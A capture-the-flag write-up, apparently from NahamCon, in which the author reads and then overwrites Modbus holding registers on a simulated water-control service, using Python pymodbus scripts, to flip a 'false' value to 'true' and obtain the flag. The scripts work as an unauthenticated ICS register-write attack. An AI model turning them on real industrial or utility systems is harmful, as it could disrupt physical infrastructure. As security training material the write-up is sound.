# Where's my Water

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/754107ae-5df1-47b1-b97c-46b765ea99a0)

Accessing the first link, we get a webpage saying that the water doesn't work.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/c3e6683e-319f-484e-99e9-aa6acc68b1a5)

Considering the hint in the description where it says `busmod`, we can deduce that the second link is for the communcation of the `modbus` protocol. I asked chatGPT how I can read this protocol, specifically the registers and it came up with the script below which I only had to minimally modify:

```python3
from pymodbus.client import ModbusTcpClient

# Modbus server IP address and port
SERVER_IP = 'challenge.nahamcon.com'
SERVER_PORT = 30144

# Modbus device ID (slave address)
DEVICE_ID = 1

# Starting address and number of registers to read
START_ADDRESS = 0
NUM_REGISTERS = 24

# Create a Modbus TCP client
client = ModbusTcpClient(SERVER_IP, SERVER_PORT)

try:
    # Connect to the Modbus server
    client.connect()

    # Read Modbus data
    response = client.read_holding_registers(START_ADDRESS, NUM_REGISTERS, unit=DEVICE_ID)

    if not response.isError():
        # Process the read data
        data = response.registers
        for i, value in enumerate(data):
            register_address = START_ADDRESS + i
            print(f'Register {register_address}: {value}')
    else:
        print(f'Error reading Modbus data: {response.message}')

except Exception as e:
    print(f'Error: {str(e)}')

finally:
    # Close the Modbus connection
    client.close()
```

I ran this script and then used `awk` to parse out the content:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/1109178b-54fd-4727-bb25-ca55e4ecc3d1)

It would seem that our registers tell us that the water is turned off:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/69f0f836-6f52-4525-a1ba-aca1d2791e91)

I asked ChatGPT to help me write to the modbus registers. I need to write only the `false` statement and set it to true.   
116 = t  
114 = r  
117 = u  
101 = e   

17 is not a letter character so it won't be taken into account. I initally read more than the first 24 registers and all of them after the 24th one was set to 17.

```python3
from pymodbus.client import ModbusTcpClient

# Modbus server IP address and port
SERVER_IP = 'challenge.nahamcon.com'
SERVER_PORT = 30144

# Modbus device ID (slave address)
DEVICE_ID = 1

# Register addresses and corresponding values to write
register_values = {
    19: 116,
    20: 114,
    21: 117,
    22: 101,
    23: 17,
    # Add more register addresses and values as needed
}

# Create a Modbus TCP client
client = ModbusTcpClient(SERVER_IP, SERVER_PORT)

try:
    # Connect to the Modbus server
    client.connect()

    # Write values to Modbus registers
    for register_address, value in register_values.items():
        response = client.write_register(register_address, value, unit=DEVICE_ID)

        if not response.isError():
            print(f'Successfully wrote value {value} to register {register_address}')
        else:
            print(f'Error writing to register {register_address}: {response.message}')

except Exception as e:
    print(f'Error: {str(e)}')

finally:
    # Close the Modbus connection
    client.close()
```

I ran the script and got confirmation that I wrote to the registers turning the water on:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/e7ccad44-3750-44f4-b6f9-475c2f909658)

I refreshed the page and got the flag:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/a6a6bf10-5b68-4eed-9be9-0dcff505de8e)

flag{fe01fd254c40488ff3f164e2343cd0044c6d87d3}



